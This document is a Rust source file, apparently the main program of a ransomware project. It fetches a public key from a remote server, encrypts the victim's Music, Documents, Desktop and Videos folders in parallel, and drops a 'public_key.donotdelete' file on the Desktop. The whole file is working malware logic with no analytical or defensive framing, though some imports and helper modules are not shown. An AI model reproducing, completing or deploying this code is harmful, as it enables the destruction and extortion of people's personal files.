use std::path::PathBuf;
use std::fs;
use std::io::{self, Write};

use anyhow::Result;

// use c_monster_co_2ic80::cryptography::encrypt::encrypt_folder;
use c_monster_co_2ic80::cryptography::parallel_encrypt::encrypt_folder_parallel;
use c_monster_co_2ic80::networking::client::gen_key;

use sodiumoxide::crypto::box_::{PublicKey};

use windows::{
    core::PWSTR,
};

fn desktop_file_path(filename: &str) -> Result<PathBuf> {
    unsafe {
        let path: PWSTR = SHGetKnownFolderPath(&FOLDERID_Desktop, KNOWN_FOLDER_FLAG(0), None)?;

        let desktop = path.to_string().unwrap();
        Ok(PathBuf::from(desktop).join(filename))
    }
}

// ENCRYPTING
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    sodiumoxide::init().unwrap();

    let pk: PublicKey = gen_key().await?;

    let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];

    unsafe {
        for path in paths {
            let path_ptr: PWSTR = SHGetKnownFolderPath(&path, KNOWN_FOLDER_FLAG(0), None).unwrap();
            let path_str = path_ptr.to_string().unwrap();
            let path_buf: PathBuf = path_str.into();
            println!("path: {:?}", path_buf);


            // match encrypt_folder(&path_buf, &pk) {
            match encrypt_folder_parallel(&path_buf, &pk, None).await {
                Ok(_) => println!("✓ Successfully encrypted: {:?}", path),
                Err(e) => println!("✗ Error encrypting {:?}: {}", path, e),
            }

            let out_path = desktop_file_path("public_key.donotdelete")?;
            fs::write(out_path, &pk)?;
        }
    }

    println!("\nPress Enter to exit...");
    io::stdout().flush()?;
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;

    Ok(())
}
